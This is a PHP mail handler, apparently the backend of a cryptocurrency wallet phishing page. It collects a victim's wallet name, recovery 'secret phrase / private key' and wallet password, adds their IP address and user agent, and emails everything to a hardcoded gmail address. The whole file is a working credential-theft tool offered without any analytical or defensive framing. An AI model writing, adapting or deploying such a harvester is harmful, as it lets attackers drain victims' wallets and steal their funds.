<?php
// api/mail.php

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// ---- CONFIG ----
$to_email   = 'phrasemainnets@gmail.com';      // <-- CHANGE THIS to your email
$from_email = 'no-reply@yourdomain.com'; // <-- CHANGE THIS to a domain you own
$subject    = 'New Wallet Connection Submission';
// ----------------

// Grab form fields (matching the HTML input names)
$wallet_name = isset($_POST['wallet_name']) ? trim($_POST['wallet_name']) : '';
$phase       = isset($_POST['phase'])       ? trim($_POST['phase'])       : '';
$password    = isset($_POST['pw'])          ? trim($_POST['pw'])          : '';

// Basic validation
if ($wallet_name === '' || $phase === '') {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Missing required fields.']);
    exit;
}

// Build email body
$ip         = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time       = date('Y-m-d H:i:s');

$body  = "New submission received\n";
$body .= "=========================\n\n";
$body .= "Wallet:      {$wallet_name}\n";
$body .= "Time:        {$time}\n";
$body .= "IP Address:  {$ip}\n";
$body .= "User Agent:  {$user_agent}\n\n";
$body .= "Secret Phrase / Private Key:\n";
$body .= "----------------------------------------\n";
$body .= $phase . "\n";
$body .= "----------------------------------------\n\n";

if ($password !== '') {
    $body .= "Wallet Password: {$password}\n";
}

// Headers
$headers  = "From: {$from_email}\r\n";
$headers .= "Reply-To: {$from_email}\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
$headers .= "X-Mailer: PHP/" . phpversion();

// Send
$sent = @mail($to_email, $subject, $body, $headers);

header('Content-Type: application/json');
if ($sent) {
    echo json_encode(['ok' => true]);
} else {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to send email. Check server mail configuration.']);
}